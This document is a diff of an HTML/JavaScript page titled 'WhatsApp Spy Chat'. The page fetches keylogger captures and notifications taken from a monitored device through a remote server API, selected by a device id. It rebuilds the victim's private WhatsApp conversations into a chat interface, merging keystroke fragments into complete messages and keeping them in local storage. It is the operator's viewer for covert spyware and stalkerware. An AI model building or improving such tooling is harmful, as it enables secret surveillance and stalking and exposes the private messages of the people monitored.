@@ -3,129 +3,270 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Spy View</title>
+    <title>WhatsApp Spy Chat</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { margin: 0; font-family: sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
-        .sidebar { width: 300px; background: #202c33; border-right: 1px solid #374045; overflow-y: auto; }
-        .chat-area { flex: 1; background: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; display: flex; flex-direction: column; }
+        /* --- CSS STYLES --- */
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
         
-        .contact { padding: 15px; border-bottom: 1px solid #2a3942; cursor: pointer; display: flex; align-items: center; }
-        .contact:hover, .contact.active { background: #2a3942; }
-        .avatar { width: 40px; height: 40px; background: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px; font-weight: bold; }
+        /* Sidebar (Contact List) */
+        .sidebar { width: 30%; max-width: 350px; background: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; }
+        .sidebar-header { padding: 15px; background: #202c33; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; }
+        .contact-list { flex: 1; overflow-y: auto; }
         
-        .header { padding: 10px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; }
-        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 5px; }
+        .contact { padding: 12px 15px; border-bottom: 1px solid #2a3942; cursor: pointer; display: flex; align-items: center; transition: background 0.2s; }
+        .contact:hover { background: #2a3942; }
+        .contact.active { background: #2a3942; }
         
-        /* BUBBLES */
-        .msg { max-width: 70%; padding: 8px 12px; border-radius: 8px; font-size: 14px; position: relative; word-wrap: break-word; }
-        
-        /* INCOMING (Left) */
-        .msg.incoming { background: #202c33; align-self: flex-start; border-top-left-radius: 0; }
-        
-        /* OUTGOING (Right) */
-        .msg.outgoing { background: #005c4b; align-self: flex-end; border-top-right-radius: 0; }
-        
-        .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 5px; }
+        .avatar { width: 45px; height: 45px; background: #00a884; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 18px; font-weight: bold; flex-shrink: 0; }
+        .contact-info { flex: 1; overflow: hidden; }
+        .contact-name { font-size: 16px; font-weight: 500; color: #e9edef; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .last-msg { font-size: 13px; color: #8696a0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
+        /* Chat Area */
+        .chat-area { flex: 1; background-color: #0b141a; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); display: flex; flex-direction: column; position: relative; }
+        
+        .chat-header { padding: 10px 15px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; height: 60px; }
+        .back-btn { display: none; margin-right: 15px; color: #e9edef; font-size: 20px; cursor: pointer; }
+        .chat-title { font-size: 16px; font-weight: 600; }
+
+        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
+        .welcome-screen { display: flex; justify-content: center; align-items: center; height: 100%; color: #8696a0; font-size: 14px; }
+
+        /* Bubbles */
+        .msg { max-width: 65%; padding: 6px 10px; border-radius: 8px; font-size: 14.2px; position: relative; word-wrap: break-word; line-height: 1.4; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
+        
+        .msg.incoming { background: #202c33; align-self: flex-start; border-top-left-radius: 0; }
+        .msg.outgoing { background: #005c4b; align-self: flex-end; border-top-right-radius: 0; }
+
+        .msg-meta { display: flex; justify-content: flex-end; align-items: center; gap: 4px; margin-top: 2px; }
+        .time { font-size: 11px; color: #8696a0; }
+        
+        /* Mobile Responsive */
         @media(max-width: 768px) {
-            .sidebar { width: 100%; position: absolute; z-index: 2; height: 100%; }
-            .chat-area { width: 100%; position: absolute; z-index: 1; }
+            .sidebar { width: 100%; position: absolute; z-index: 10; height: 100%; }
+            .chat-area { width: 100%; position: absolute; z-index: 5; height: 100%; }
             .sidebar.hidden { display: none; }
+            .back-btn { display: block; }
         }
     </style>
 </head>
 <body>
 
     <div class="sidebar" id="sidebar">
-        <div style="padding:15px; font-weight:bold; color:#00a884;">CHATS (Live)</div>
-        <div id="contactList">Loading...</div>
+        <div class="sidebar-header">
+            <span>Chats</span>
+            <i class="fas fa-sync-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#8696a0;" title="Clear Local Storage"></i>
+        </div>
+        <div class="contact-list" id="contactList">
+            <div style="padding:20px; text-align:center; color:#8696a0;">Waiting for data...</div>
+        </div>
     </div>
 
     <div class="chat-area">
-        <div class="header" id="chatHeader" style="display:none;">
-            <i class="fas fa-arrow-left" onclick="toggleSidebar()" style="margin-right:10px; cursor:pointer;"></i>
-            <span id="chatTitle">Select a Chat</span>
+        <div class="chat-header" id="chatHeader" style="display:none;">
+            <i class="fas fa-arrow-left back-btn" onclick="showSidebar()"></i>
+            <div class="avatar" id="headerAvatar" style="width:35px; height:35px; font-size:14px; margin-right:10px;"></div>
+            <span class="chat-title" id="chatTitle">User</span>
         </div>
-        <div class="messages" id="msgBox"></div>
+        
+        <div class="messages" id="msgBox">
+            <div class="welcome-screen">Select a contact to view history</div>
+        </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
+        
+        // Local Storage Key (Unique per device)
+        const STORAGE_KEY = `whatsapp_spy_v2_${deviceId}`;
+
         const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
         const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
 
+        // Main Data Structure
+        // { "FriendName": [ {text: "Hi", time: 123, type: "incoming"}, ... ] }
         let allChats = {}; 
         let currentChatUser = null;
 
+        // 1. Load Data from Local Storage on Start
+        function loadStorage() {
+            const saved = localStorage.getItem(STORAGE_KEY);
+            if (saved) {
+                try {
+                    allChats = JSON.parse(saved);
+                    renderContacts();
+                } catch(e) { console.error("Storage Corrupt", e); }
+            }
+        }
+
+        // 2. Fetch & Merge Data
         async function syncData() {
             if (!deviceId) return;
 
             try {
-                // DONO APIs se data mangao
                 const [logs, notifs] = await Promise.all([
                     fetch(API_KEYLOGS).then(r => r.json()).catch(()=>[]),
                     fetch(API_NOTIFS).then(r => r.json()).catch(()=>[])
                 ]);
 
-                // DATA PROCESSING
+                let hasNewData = false;
+
+                // --- PROCESS OUTGOING (Keylogs) ---
                 logs.forEach(item => {
-                    // Agar Android se 'type' outgoing_keylog hai -> RIGHT SIDE
-                    if (item.type === 'outgoing_keylog' || item.appName === 'WhatsApp') {
-                        addMsg(item.title || "Unknown", item.text, item.timestamp, 'outgoing');
+                    // Check strict outgoing conditions
+                    if (item.type === 'outgoing_keylog' || (item.appName === 'WhatsApp' && !item.packageName)) {
+                        const added = processMessage(item.title || "Unknown", item.text, item.timestamp, 'outgoing');
+                        if (added) hasNewData = true;
                     }
-                    // Agar Android se 'type' incoming_screen hai -> LEFT SIDE
+                    // Some keylogs capture incoming screen text too
                     else if (item.type === 'incoming_screen') {
-                        addMsg(item.title || "Unknown", item.text, item.timestamp, 'incoming');
+                        const added = processMessage(item.title || "Unknown", item.text, item.timestamp, 'incoming');
+                        if (added) hasNewData = true;
                     }
                 });
 
-                // NOTIFICATIONS (Backup Incoming)
+                // --- PROCESS INCOMING (Notifications) ---
+                // Notification Array should be sorted Oldest -> Newest first
+                notifs.sort((a,b) => a.postTime - b.postTime);
+
                 notifs.forEach(item => {
-                    if(item.packageName && item.packageName.includes('whatsapp')) {
-                        addMsg(item.title, item.text, item.timestamp, 'incoming');
+                    const pkg = (item.packageName || "").toLowerCase();
+                    if(pkg.includes('whatsapp')) {
+                        const added = processMessage(item.title, item.text, item.postTime, 'incoming');
+                        if(added) hasNewData = true;
                     }
                 });
 
-                renderContacts();
-                if(currentChatUser) renderMessages(currentChatUser);
+                if (hasNewData) {
+                    saveStorage();
+                    renderContacts();
+                    if(currentChatUser) renderMessages(currentChatUser);
+                }
 
             } catch(e) { console.log(e); }
         }
 
-        function addMsg(user, text, time, type) {
-            if(!user || !text) return;
-            if(!allChats[user]) allChats[user] = [];
+        // 3. CORE LOGIC: Filtering & Adding Messages
+        function processMessage(user, text, time, type) {
+            if (!user || !text) return false;
+            
+            // Clean up User Name (Remove "WhatsApp", "Message from", etc if needed)
+            if (user.includes("WhatsApp")) return false; // Usually system notification
 
-            // Duplicate Check
-            const exists = allChats[user].some(m => m.text === text && Math.abs(m.time - time) < 5000);
-            if(!exists) {
-                allChats[user].push({ text, time, type });
-                // Sort by time
-                allChats[user].sort((a,b) => a.time - b.time);
+            // Initialize User Array
+            if (!allChats[user]) allChats[user] = [];
+
+            const chatHistory = allChats[user];
+            
+            // --- FILTERING RULES (JUNK REMOVAL) ---
+            const lowerText = text.toLowerCase();
+            if (lowerText.includes("checking for new messages")) return false;
+            if (lowerText.includes("whatsapp web is currently active")) return false;
+            if (lowerText.includes("incoming voice call")) return false;
+            if (lowerText.includes("incoming video call")) return false;
+            if (lowerText.match(/^\d+ new messages?/)) return false; // "3 new messages"
+
+            // --- DUPLICATE CHECK LOGIC ---
+            // Look at the last few messages to see if this is a repeat
+            const lastMsg = chatHistory[chatHistory.length - 1];
+
+            if (lastMsg) {
+                const timeDiff = Math.abs(time - lastMsg.time);
+                
+                // Rule 1: Exact Duplicate within 10 seconds -> REJECT
+                if (text === lastMsg.text && timeDiff < 10000) {
+                    return false;
+                }
+
+                // Rule 2: "Summary" Logic (Incoming Only)
+                // If new text contains old text (e.g. "Hello" -> "Hello World")
+                if (type === 'incoming' && text.includes(lastMsg.text) && text.length > lastMsg.text.length && timeDiff < 10000) {
+                    // Replace the old shorter message with the new longer one
+                    chatHistory.pop(); // Remove old
+                    chatHistory.push({ text, time, type }); // Add new
+                    return true;
+                }
+
+                // Rule 3: Keylog Noise (Outgoing Only)
+                // If I type "H", then "He", then "Hel", then "Hello"
+                // We only want "Hello".
+                if (type === 'outgoing' && text.includes(lastMsg.text) && timeDiff < 5000) {
+                    chatHistory.pop();
+                    chatHistory.push({ text, time, type });
+                    return true;
+                }
+            }
+
+            // If passed all checks, Add to history
+            chatHistory.push({ text, time, type });
+            
+            // Re-sort history by time (Just in case async messes up order)
+            chatHistory.sort((a,b) => a.time - b.time);
+            
+            return true;
+        }
+
+        function saveStorage() {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(allChats));
+        }
+
+        function resetData() {
+            if(confirm("Clear all chat history from this device?")) {
+                localStorage.removeItem(STORAGE_KEY);
+                location.reload();
             }
         }
 
+        // --- UI RENDERING ---
+
         function renderContacts() {
             const list = document.getElementById('contactList');
+            const users = Object.keys(allChats);
+            
+            // Sort users by latest message time
+            users.sort((a,b) => {
+                const lastA = allChats[a][allChats[a].length-1].time;
+                const lastB = allChats[b][allChats[b].length-1].time;
+                return lastB - lastA;
+            });
+
+            if(users.length === 0) return;
+            
             list.innerHTML = "";
-            Object.keys(allChats).forEach(user => {
-                const div = document.createElement('div');
-                div.className = `contact ${currentChatUser === user ? 'active' : ''}`;
-                div.onclick = () => openChat(user);
-                div.innerHTML = `<div class="avatar">${user[0]}</div> <div>${user}</div>`;
-                list.appendChild(div);
+            users.forEach(user => {
+                const history = allChats[user];
+                const lastMsg = history[history.length - 1];
+                const isActive = currentChatUser === user ? 'active' : '';
+                
+                // Format last message preview
+                let preview = lastMsg.text;
+                if (lastMsg.type === 'outgoing') preview = `<i class="fas fa-check" style="font-size:10px;"></i> ${preview}`;
+
+                list.innerHTML += `
+                    <div class="contact ${isActive}" onclick="openChat('${user}')">
+                        <div class="avatar">${user.charAt(0).toUpperCase()}</div>
+                        <div class="contact-info">
+                            <div class="contact-name">${user}</div>
+                            <div class="last-msg">${preview}</div>
+                        </div>
+                    </div>
+                `;
             });
         }
 
         function openChat(user) {
             currentChatUser = user;
             document.getElementById('chatTitle').innerText = user;
+            document.getElementById('headerAvatar').innerText = user.charAt(0).toUpperCase();
+            
             document.getElementById('chatHeader').style.display = 'flex';
             
-            // Mobile toggle
-            if(window.innerWidth < 768) document.getElementById('sidebar').classList.add('hidden');
+            // Mobile: Hide Sidebar
+            if(window.innerWidth < 768) {
+                document.getElementById('sidebar').classList.add('hidden');
+            }
             
             renderMessages(user);
         }
@@ -135,22 +276,50 @@
             box.innerHTML = "";
             const msgs = allChats[user] || [];
             
+            // Date formatting helper
+            let lastDate = null;
+
             msgs.forEach(m => {
+                const dateObj = new Date(m.time);
+                const dateStr = dateObj.toLocaleDateString();
+                
+                // Add Date Divider if day changed
+                if (lastDate !== dateStr) {
+                    const div = document.createElement('div');
+                    div.style.cssText = "align-self:center; background:#1f2c34; color:#8696a0; font-size:12px; padding:5px 10px; border-radius:10px; margin:10px 0;";
+                    div.innerText = dateStr;
+                    box.appendChild(div);
+                    lastDate = dateStr;
+                }
+
                 const div = document.createElement('div');
                 div.className = `msg ${m.type}`;
-                const timeStr = new Date(m.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
-                div.innerHTML = `${m.text} <span class="time">${timeStr}</span>`;
+                const timeStr = dateObj.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', hour12: false}); // 24H format requested before
+                
+                div.innerHTML = `
+                    ${m.text}
+                    <div class="msg-meta">
+                        <span class="time">${timeStr}</span>
+                        ${m.type === 'outgoing' ? '<i class="fas fa-check-double" style="font-size:10px; color:#53bdeb;"></i>' : ''} 
+                    </div>
+                `;
                 box.appendChild(div);
             });
+            
+            // Auto scroll to bottom
             box.scrollTop = box.scrollHeight;
         }
 
-        function toggleSidebar() {
+        function showSidebar() {
             document.getElementById('sidebar').classList.remove('hidden');
+            currentChatUser = null;
         }
 
-        setInterval(syncData, 3000); // 3 sec refresh
+        // Init
+        loadStorage();
         syncData();
+        setInterval(syncData, 4000); // Check for new data every 4 seconds
+
     </script>
 </body>
 </html>
